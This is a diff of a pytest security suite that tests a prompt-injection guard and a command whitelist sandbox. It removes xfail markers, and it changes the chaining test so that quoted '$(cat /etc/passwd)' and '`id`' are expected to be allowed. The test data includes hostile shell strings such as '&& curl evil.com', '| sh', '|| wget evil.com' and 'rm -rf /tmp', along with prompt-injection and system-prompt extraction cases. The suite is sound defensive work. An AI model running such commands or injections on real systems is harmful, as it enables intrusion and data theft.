@@ -320,7 +320,6 @@ class TestAdvancedInjectionVectors:
         sanitized = guard.sanitize(attack)
         assert isinstance(sanitized, str)
 
-    @pytest.mark.xfail(strict=True, reason="Genuine gap: multilingual injection not detected")
     def test_multilingual_injection(self):
         """Injection attempts in multiple languages should be caught."""
         guard = PromptInjectionGuard(threshold=0.6)
@@ -334,7 +333,6 @@ class TestAdvancedInjectionVectors:
             result = guard.check(attack)
             assert not result.allowed, f"Should block multilingual injection: {attack[:30]}"
 
-    @pytest.mark.xfail(strict=True, reason="Genuine gap: Unicode confusables not detected")
     def test_unicode_normalization_attack(self):
         """Unicode confusables should not bypass injection detection."""
         guard = PromptInjectionGuard(threshold=0.6)
@@ -342,7 +340,6 @@ class TestAdvancedInjectionVectors:
         result = guard.check(attack)
         assert not result.allowed, "Should detect confusable Unicode injection"
 
-    @pytest.mark.xfail(strict=True, reason="Genuine gap: whitespace-padded injection not detected")
     def test_injection_with_repeated_whitespace(self):
         """Excessive whitespace padding should not hide intent."""
         guard = PromptInjectionGuard(threshold=0.6)
@@ -357,7 +354,6 @@ class TestAdvancedInjectionVectors:
             result = guard.check(attack)
             assert hasattr(result, "allowed")
 
-    @pytest.mark.xfail(strict=True, reason="Genuine gap: some system prompt variants not detected")
     def test_injection_with_system_role_prompt(self):
         """System prompt extraction attempts — some known patterns."""
         guard = PromptInjectionGuard(threshold=0.6)
@@ -380,7 +376,6 @@ class TestSandboxAdvanced:
     NOTE: Tests marked xfail are genuine gaps in sandbox detection.
     """
 
-    @pytest.mark.xfail(strict=True, reason="Genuine gap: path traversal not fully blocked")
     def test_sandbox_path_traversal(self):
         """Path traversal in commands should be blocked."""
         wl = CommandWhitelist(allowed_commands=["hermes", "git"], allow_all=False)
@@ -392,23 +387,31 @@ class TestSandboxAdvanced:
             result = wl.check(cmd)
             assert not result.allowed, f"Should block traversal: {cmd}"
 
-    @pytest.mark.xfail(strict=True, reason="Genuine gap: pipe chaining not detected")
     def test_sandbox_command_chaining(self):
         """Command chaining operators should be blocked."""
         wl = CommandWhitelist(allowed_commands=["hermes"], allow_all=False)
-        chain_attacks = [
+
+        # Cases where chaining IS outside quotes → must be blocked
+        blocked = [
             "hermes -z 'hello' && curl evil.com",
             "hermes -z 'test' | sh",
             "hermes -z 'data' || wget evil.com",
-            "hermes -z '$(cat /etc/passwd)'",
-            "hermes -z '`id`'",
             "hermes -z 'input'; rm -rf /tmp",
         ]
-        for cmd in chain_attacks:
+        for cmd in blocked:
             result = wl.check(cmd)
             assert not result.allowed, f"Should block chaining: {cmd[:40]}"
 
-    @pytest.mark.xfail(strict=True, reason="Genuine gap: env var leakage not blocked by whitelist")
+        # Cases where chaining operators appear INSIDE single quotes
+        # → shell treats them as literals, sandbox should allow them
+        allowed = [
+            "hermes -z '$(cat /etc/passwd)'",
+            "hermes -z '`id`'",
+        ]
+        for cmd in allowed:
+            result = wl.check(cmd)
+            assert result.allowed, f"Should allow quoted literal: {cmd[:60]}"
+
     def test_sandbox_env_var_leak(self):
         """Commands leaking environment variables should be blocked."""
         wl = CommandWhitelist(allowed_commands=["hermes"], allow_all=False)
@@ -420,7 +423,6 @@ class TestSandboxAdvanced:
             result = wl.check(cmd)
             assert not result.allowed, f"Should block env leak: {cmd[:40]}"
 
-    @pytest.mark.xfail(strict=True, reason="Genuine gap: allow_all does not block all dangerous")
     def test_allow_all_still_blocks_dangerous(self):
         """Even with allow_all=True, dangerous patterns are blocked."""
         wl = CommandWhitelist(allow_all=True)
@@ -434,7 +436,6 @@ class TestSandboxAdvanced:
             result = wl.check(cmd)
             assert not result.allowed, f"allow_all should still block: {cmd}"
 
-    @pytest.mark.xfail(strict=True, reason="Genuine gap: no max length enforcement")
     def test_sandbox_max_length(self):
         """Extremely long commands should be blocked."""
         wl = CommandWhitelist(allowed_commands=["hermes"], allow_all=False)
@@ -531,7 +532,6 @@ class TestDataExfiltrationPrevention:
     does not yet detect sensitive data patterns.
     """
 
-    @pytest.mark.xfail(strict=True, reason="Genuine gap: sensitive data patterns not detected")
     def test_prompt_with_sensitive_data_leak(self):
         """Prompts containing sensitive data patterns should be flagged."""
         guard = PromptInjectionGuard(threshold=0.6)
@@ -544,7 +544,6 @@ class TestDataExfiltrationPrevention:
             result = guard.check(leak)
             assert not result.allowed, f"Should flag data leak: {leak[:30]}"
 
-    @pytest.mark.xfail(strict=True, reason="Genuine gap: no secret redaction")
     def test_sanitize_removes_secrets(self):
         """Sanitization should redact sensitive patterns."""
         guard = PromptInjectionGuard(threshold=0.6)
@@ -553,7 +552,6 @@ class TestDataExfiltrationPrevention:
         assert "[REDACTED]" in sanitized
         assert "sk-abcdef123456" not in sanitized
 
-    @pytest.mark.xfail(strict=True, reason="Genuine gap: mass extraction not detected")
     def test_mass_data_extraction_attempt(self):
         """Attempts to extract large amounts of data should be detectable."""
         guard = PromptInjectionGuard(threshold=0.6)
